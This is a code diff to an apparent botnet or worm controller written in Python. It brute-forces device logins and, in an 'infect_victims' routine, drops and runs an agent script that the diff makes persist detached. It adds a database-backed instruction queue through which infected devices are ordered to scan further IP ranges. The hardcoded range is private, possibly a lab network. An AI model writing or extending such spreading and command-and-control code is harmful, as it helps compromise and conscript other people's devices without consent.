@@ -31,6 +31,7 @@ def main():
     brute_next_device()
     time.sleep(1) # ugly but works
     asyncio.run(infect_victims())
+    scan(False, "172.18.0.0", "28")
 
 
 # this and the below function install programs have the purpose of
@@ -58,8 +59,9 @@ async def shell(reader, writer, dev_id, username, password):
             if "$" in output:
                 writer.write(f"echo {dev_id} > dev_id\r\n")
                 writer.write(f"chmod +x agent.sh\r\n")
-                writer.write(f"./agent.sh\r\n")
+                writer.write(f"./agent.sh & disown\r\n")
                 writer.write("exit\r\n")
+                break;
             
 def get_device_data_from_db(ip):
     con = get_con()
@@ -74,12 +76,23 @@ def get_device_data_from_db(ip):
     return rows
 
 def scan(from_root, iprange, ipmask):
+    con = get_con()
     if from_root:
         rc = subprocess.run([f"{default_bin_path}/scanner_amd64", iprange, ipmask])
         return rc
     else:
-        # SELECT RANDO TO DO IT
-        pass
+        # fetch first non_busy device
+        row = con.execute("""
+            SELECT device_id FROM devices WHERE busy = 0
+                          """).fetchone()
+        con.close()
+        print(f"Non busy devices: {row}")
+        if row == None:
+            return
+        (device_id,) = row
+        instruction = f"scan {iprange} {ipmask}"
+        print("Instructing {device_id} to scan {iprange}/{ipmask}")
+        give_instruction(instruction, device_id)
 
 def update_bruted_status():
     con = get_con()
@@ -95,6 +108,21 @@ def update_bruted_status():
     """)
     con.commit()
     con.close()
+
+def give_instruction(instruction, device_id):
+    con = get_con()
+    con.execute("""
+    INSERT INTO instructions (device_id, instruction, status)
+    VALUES (?, ?, ?)
+    ON CONFLICT(device_id)
+    DO UPDATE SET
+        instruction = excluded.instruction,
+        status = excluded.status
+    WHERE excluded.status = 1
+    """, [device_id, instruction, 0])
+    con.commit()
+    con.close()
+
 
 # picks first device from db row and brutes it, marks as bruted and adds to devices
 def brute_next_device():
@@ -157,6 +185,6 @@ async def infect_victims():
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
-        asyncio.run(infect_victims())
+        scan(False, "172.18.0.0", "28")
     else:
         main()
